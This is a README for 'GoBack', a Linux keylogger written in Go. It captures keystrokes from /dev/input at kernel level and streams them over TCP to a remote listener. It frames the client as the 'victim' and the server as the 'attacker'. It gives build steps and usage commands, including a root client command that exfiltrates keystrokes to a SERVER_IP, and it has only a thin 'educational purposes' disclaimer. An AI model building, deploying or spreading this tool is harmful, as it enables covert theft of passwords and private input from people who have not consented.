> **DISCLAIMER:** This software is for **educational purposes and security research only**. The author takes no responsibility for any misuse of this tool.

> **PROJECT STILL IN DEVELOPMENT**

**GoBack** is a lightweight, low-level keylogger written in **Go**. It interacts directly with the Linux Kernel input subsystem (`/dev/input/`) to capture keystrokes and stream them to a remote server via TCP.

Unlike standard keyloggers, it works independently of the graphical interface (X11/Wayland), supports multiple keyboards simultaneously, and reads hardware LED states.

## Features

* **Single Binary:** Works as both `client` (victim) and `server` (attacker) based on flags.
* **Kernel-Level Capture:** Reads raw `input_event` structs from `/dev/input/eventX`.
* **Multi-Device Support:** Automatically detects and monitors all connected keyboards using **Goroutines**.
* **Hardware State Awareness:** Uses `ioctl` syscalls to correctly detect CapsLock/NumLock states directly from hardware.
* **TCP Streaming:** Real-time data exfiltration over a simple TCP connection.

## Build & Install

Requirements: **Go 1.21+**

```bash
# 1. Clone the repository
git clone [https://github.com/your-username/goback.git](https://github.com/your-username/goback.git)
cd goback

# 2. Install dependencies
go mod tidy

# 3. Build the binary
go build -o bin/goback cmd/goback/main.go
```
## Usage

### 1. Start the Server (Listener)

Run this on the machine that will receive the keystrokes.
```Bash

./bin/goback server -p 9090
```
### 2. Start the Client (Target)

Run this on the target Linux machine. Root privileges are required to read /dev/input/.
```Bash

Usage: client -h <SERVER_IP> <SERVER_PORT>
sudo ./bin/goback client -h 127.0.0.1 9090
```
Once running, the client will auto-detect keyboards and stream keys to the server immediately.

## Project Structure
```
.
├── bin/             # Compiled binaries
├── cmd/
│   └── goback/      # Main entry point and CLI parsing
├── internal/
│   ├── keyboard/    # Low-level capture logic (IOCTL, Discovery, Parsing)
│   └── network/     # TCP Client/Server logic
└── go.mod           # Go module definition
```
Developed by Joao Laimer.
